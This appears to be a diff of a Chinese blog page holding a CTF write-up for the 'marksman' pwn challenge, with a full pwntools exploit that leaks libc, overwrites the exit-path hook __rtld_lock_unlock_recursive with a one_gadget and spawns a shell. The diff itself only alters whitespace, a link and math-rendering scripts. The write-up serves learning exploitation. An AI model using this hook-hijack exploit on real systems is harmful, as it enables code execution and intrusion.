@@ -12,7 +12,6 @@
 <li><code>exit</code>函数的调用链为<code>exit()-&gt;__run_exit_handlers-&gt;_dl_fini-&gt;__rtld_lock_unlock_recursive</code>，<code>__rtld_lock_unlock_recursive</code>是一个<code>hook</code>指针，可以劫持该函数指针写入<code>one_gadget</code>。一般来说，程序都会调用<code>__libc_start_main</code>，之后调用<code>exit</code>来退出。</li>
 </ul>
 <span id="more"></span>
-
 <h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><h4 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h4><p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210421220656415.png" alt="image-20210421220656415"></p>
 <h4 id="函数分析"><a href="#函数分析" class="headerlink" title="函数分析"></a>函数分析</h4><p>本题只包含一个<code>main</code>函数，因此，分析起来也很简单。</p>
 <h5 id="main"><a href="#main" class="headerlink" title="main"></a>main</h5><p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210421221038478.png" alt="image-20210421221038478"></p>
@@ -58,13 +57,11 @@
 <ul>
 <li><p>首先，泄露出地址，并计算出<code>libc</code>基地址，同时得到需要跳转的地址</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sh.recvuntil(<span class="string">&quot;I placed the target near: &quot;</span>)</span><br><span class="line">msg = sh.recvline()</span><br><span class="line"></span><br><span class="line">puts_addr = int16(msg[:-<span class="number">1</span>].decode())</span><br><span class="line">LOG_ADDR(<span class="string">&quot;puts_addr&quot;</span>, puts_addr)</span><br><span class="line">libc_base_addr = puts_addr - <span class="number">0x809c0</span></span><br><span class="line">LOG_ADDR(<span class="string">&quot;libc_base_addr&quot;</span>, libc_base_addr)</span><br><span class="line"></span><br><span class="line">one_gadget1 = libc_base_addr + <span class="number">0xe569f</span></span><br><span class="line">_dl_catch_error_offset = <span class="number">0x5f4038</span></span><br><span class="line">target_addr = libc_base_addr + _dl_catch_error_offset</span><br></pre></td></tr></table></figure>
-
 <p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210421235945084.png" alt="image-20210421235945084"></p>
 <p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210422000022426.png" alt="image-20210422000022426"></p>
 </li>
 <li><p>然后，修改目标地址为<code>one_gadget</code></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sh.sendlineafter(<span class="string">&quot;shoot!shoot!\n&quot;</span>, <span class="built_in">str</span>(target_addr))</span><br><span class="line">input_gadget = one_gadget1</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;biang!\n&quot;</span>, <span class="built_in">chr</span>(input_gadget &amp; <span class="number">0xff</span>))</span><br><span class="line">    input_gadget = input_gadget &gt;&gt; <span class="number">8</span></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-
 <p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210422000101901.png" alt="image-20210422000101901"></p>
 </li>
 <li><p>获取<code>shell</code></p>
@@ -84,10 +81,9 @@
 <p>这正是我们上面改的地址，存储着<code>_dl_catch_error@plt+6</code>，所以最终需要更改的偏移为<code>0x5f4038</code>：</p>
 <p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210422001200763.png" alt="image-20210422001200763"></p>
 <h4 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> functools</span><br><span class="line"></span><br><span class="line">LOG_ADDR = <span class="keyword">lambda</span> x, y: log.success(<span class="string">&#x27;&#123;&#125; ===&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(x, <span class="built_in">hex</span>(y)))</span><br><span class="line">int16 = functools.partial(<span class="built_in">int</span>, base=<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./hfctf_2020_marksman&quot;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;I placed the target near: &quot;</span>)</span><br><span class="line">msg = sh.recvline()</span><br><span class="line"></span><br><span class="line">puts_addr = int16(msg[:-<span class="number">1</span>].decode())</span><br><span class="line">LOG_ADDR(<span class="string">&quot;puts_addr&quot;</span>, puts_addr)</span><br><span class="line">libc_base_addr = puts_addr - <span class="number">0x809c0</span></span><br><span class="line">LOG_ADDR(<span class="string">&quot;libc_base_addr&quot;</span>, libc_base_addr)</span><br><span class="line"></span><br><span class="line">one_gadget1 = libc_base_addr + <span class="number">0x10a387</span></span><br><span class="line">__rtld_lock_unlock_recursive_offset = <span class="number">0x81df60</span></span><br><span class="line">target_addr = libc_base_addr + __rtld_lock_unlock_recursive_offset</span><br><span class="line"></span><br><span class="line"><span class="comment"># one_gadget1 = libc_base_addr + 0xe569f</span></span><br><span class="line"><span class="comment"># _dl_catch_error_offset = 0x5f4038</span></span><br><span class="line"><span class="comment"># target_addr = libc_base_addr + _dl_catch_error_offset</span></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;shoot!shoot!\n&quot;</span>, <span class="built_in">str</span>(target_addr))</span><br><span class="line">input_gadget = one_gadget1</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;biang!\n&quot;</span>, <span class="built_in">chr</span>(input_gadget &amp; <span class="number">0xff</span>))</span><br><span class="line">    input_gadget = input_gadget &gt;&gt; <span class="number">8</span></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-
 <p>最后远程攻击效果如下：</p>
 <p><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210422001633544.png" alt="image-20210422001633544"></p>
-<h3 id="引用与参考"><a href="#引用与参考" class="headerlink" title="引用与参考"></a>引用与参考</h3><p>1、<a href="https://roderickchan.github.io/">My Blog</a></p>
+<h3 id="引用与参考"><a href="#引用与参考" class="headerlink" title="引用与参考"></a>引用与参考</h3><p>1、<a href="https://roderickchan.github.io">My Blog</a></p>
 <p>2、<a target="_blank" rel="noopener" href="https://www.cnblogs.com/lemon629/p/14290240.html">exit 利用</a></p>
 <p>3、<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43116977/article/details/105485947">exit hook</a></p>
 <p>4、<a target="_blank" rel="noopener" href="https://blog.csdn.net/SweeNeil/article/details/83744843">dlopen 源码分析</a></p>
@@ -151,10 +147,22 @@
                 }
                 $('.justified-gallery').justifiedGallery();
             }
-        });</script><!--!--><!--!--><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/KaTeX/0.11.1/katex.min.css"><script src="https://cdnjs.loli.net/ajax/libs/KaTeX/0.11.1/katex.min.js" defer></script><script src="https://cdnjs.loli.net/ajax/libs/KaTeX/0.11.1/contrib/auto-render.min.js" defer></script><script src="https://cdnjs.loli.net/ajax/libs/KaTeX/0.11.1/contrib/mhchem.js" defer></script><script>window.addEventListener("load", function() {
-            document.querySelectorAll('[role="article"] > .content').forEach(function(element) {
-                renderMathInElement(element);
-            });
-        });</script><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
+        });</script><!--!--><!--!--><script type="text/x-mathjax-config">MathJax.Hub.Config({
+            'HTML-CSS': {
+                matchFontHeight: false
+            },
+            SVG: {
+                matchFontHeight: false
+            },
+            CommonHTML: {
+                matchFontHeight: false
+            },
+            tex2jax: {
+                inlineMath: [
+                    ['$','$'],
+                    ['\\(','\\)']
+                ]
+            }
+        });</script><script src="https://cdnjs.loli.net/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" defer></script><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
             loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
         });</script></body></html>
